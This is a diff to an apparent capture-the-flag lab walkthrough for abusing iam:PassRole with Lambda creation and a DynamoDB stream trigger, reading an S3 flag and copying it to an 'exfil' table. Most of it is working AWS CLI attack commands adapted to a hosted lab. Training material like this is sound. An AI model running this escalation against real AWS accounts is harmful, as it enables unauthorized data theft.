@@ -10,7 +10,7 @@ This pattern appears in environments where developers have been granted broad co
 
 You start as `pl-prod-lambda-002-to-bucket-starting-user`, an IAM user with three carefully scoped permissions: `iam:PassRole` on the target role, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`. You do not have `s3:GetObject` on the flag bucket, `lambda:InvokeFunction`, or any direct path to the data.
 
-Your goal is to retrieve `flag.txt` from the target S3 bucket: `pl-prod-lambda-002-to-bucket-{account_id}-{suffix}`.
+Your goal is to retrieve `flag.txt` from the target S3 bucket. The hosted platform gives the bucket a per-deployment name: open the **Outputs** tab next to your terminal and copy the `target_bucket_name` output. You will use it as `TARGET_BUCKET` in the steps below.
 
 The Terraform-created resources in play are:
 
@@ -25,20 +25,26 @@ The Terraform-created resources in play are:
 Start by confirming your identity and verifying you lack direct S3 access:
 
 ```bash
-aws sts get-caller-identity --query 'Arn' --output text
-# arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+TARGET_BUCKET=<paste the target_bucket_name output here>
 
-aws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -
+aws sts get-caller-identity --query 'Arn' --output text
+# arn:aws:iam::<your account>:user/pl-prod-lambda-002-to-bucket-starting-user
+
+aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
 # An error occurred (AccessDenied) -- as expected
 ```
 
 Check the target role to understand what permissions you'll be working with:
 
 ```bash
-aws iam get-role --role-name pl-prod-lambda-002-to-bucket-target-role \
-  --query 'Role.Arn' --output text
-# arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role
+aws iam list-roles \
+  --query "Roles[?RoleName=='pl-prod-lambda-002-to-bucket-target-role'].Arn" \
+  --output text
+# arn:aws:iam::<your account>:role/pl-prod-lambda-002-to-bucket-target-role
 ```
+
+Your grants include `iam:ListRoles` but not `iam:GetRole`, so list and filter.
 
 Discover the trigger table's stream ARN — this is what the Lambda event source mapping will connect to:
 
@@ -87,18 +93,37 @@ cd /tmp && zip lambda_payload.zip lambda_function.py
 
 This is the core of the attack. You use `iam:PassRole` to attach the target role as the Lambda's execution role and `lambda:CreateFunction` to deploy your payload. From the moment this function exists, it has the ability to read the flag — it just needs a trigger:
 
+Hosted environments run Lambda inside an isolated VPC. Discover the lab's subnet and security group, then include them when you create the function:
+
+```bash
+SUBNET_ID=$(aws ec2 describe-subnets \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-002-to-bucket-subnet" \
+    --query 'Subnets[0].SubnetId' --output text)
+
+SG_ID=$(aws ec2 describe-security-groups \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-002-to-bucket-function-sg" \
+    --query 'SecurityGroups[0].GroupId' --output text)
+```
+
 ```bash
 aws lambda create-function \
   --function-name pl-lambda-002-to-bucket-escalation-fn \
   --runtime python3.12 \
-  --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role \
+  --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-002-to-bucket-target-role \
   --handler lambda_function.lambda_handler \
   --zip-file fileb:///tmp/lambda_payload.zip \
   --timeout 30 \
-  --environment "Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-{account_id}-{suffix},EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}"
+  --environment "Variables={TARGET_BUCKET=${TARGET_BUCKET},EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}" \
+  --vpc-config SubnetIds=${SUBNET_ID},SecurityGroupIds=${SG_ID}
 ```
 
 The Lambda function now exists with the target role's S3 read and DynamoDB write permissions — but it has not executed yet.
+
+The hosted function attaches to an isolated VPC and can take a few minutes to reach the Active state. Wait for it before wiring the trigger, or the trigger record is skipped:
+
+```bash
+aws lambda wait function-active --function-name pl-lambda-002-to-bucket-escalation-fn
+```
 
 ### Step 3: Create the event source mapping
 
@@ -109,19 +134,18 @@ STREAM_ARN=$(aws dynamodb describe-table \
   --table-name pl-prod-lambda-002-to-bucket-trigger-table \
   --query 'Table.LatestStreamArn' --output text)
 
-aws lambda create-event-source-mapping \
+UUID=$(aws lambda create-event-source-mapping \
   --function-name pl-lambda-002-to-bucket-escalation-fn \
   --event-source-arn "$STREAM_ARN" \
-  --starting-position LATEST
+  --starting-position TRIM_HORIZON \
+  --query 'UUID' --output text)
 ```
 
-The mapping starts in a `Creating` state. It typically takes 30-90 seconds to transition to `Enabled`. Poll until it's ready before triggering:
+`TRIM_HORIZON` makes the mapping read the stream from its oldest record. A `LATEST` mapping permanently skips every record written before its poller starts reading -- on a hosted deployment, that window can swallow your first trigger record. With `TRIM_HORIZON`, nothing you write is skipped, no matter when the poller starts.
+
+Capture the mapping UUID from the create response; `lambda:ListEventSourceMappings` is not part of your grants, but `lambda:GetEventSourceMapping` is. The mapping reports `Enabled` quickly, and its poller still needs up to about two minutes to start reading after that:
 
 ```bash
-UUID=$(aws lambda list-event-source-mappings \
-  --function-name pl-lambda-002-to-bucket-escalation-fn \
-  --query 'EventSourceMappings[0].UUID' --output text)
-
 # Poll until state is Enabled
 aws lambda get-event-source-mapping --uuid "$UUID" \
   --query 'State' --output text
@@ -138,7 +162,7 @@ aws dynamodb put-item \
   --item '{"pk": {"S": "trigger-1"}}'
 ```
 
-The Lambda executes asynchronously. Wait 10-15 seconds for the function to complete and for DynamoDB to reflect the write. If the exfil table is empty after 30 seconds, the event source mapping may need a few more seconds despite showing `Enabled` — insert another record and wait again.
+The Lambda executes asynchronously. Wait 10-15 seconds, then check the exfil table with the `get-item` in the Verification step below. The mapping's poller can take up to about two minutes to pick the record up after the mapping shows `Enabled`, so give it that long before you worry. If the exfil table is still empty after that, insert another record with a new key and check again.
 
 ## Verification
 
@@ -159,7 +183,7 @@ If this returns the flag value, the Lambda executed successfully under the targe
 The flag is `flag.txt` inside the target S3 bucket. The Lambda exfiltrated its contents to the exfil DynamoDB table — the `dynamodb:GetItem` call above is the retrieval step. The canonical CLI retrieval from the source bucket (using the target role's `s3:GetObject` permission, which the Lambda exercised) is:
 
 ```bash
-aws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -
+aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
 ```
 
 Note that your starting user credentials do not have `s3:GetObject` on this bucket — only the Lambda execution role does. The flag value you captured from the exfil DynamoDB table is what the Lambda read from the bucket using the target role. This is the indirect exfiltration path: your credentials never touched S3 directly; the target role did it on your behalf, triggered by the stream event you manufactured.
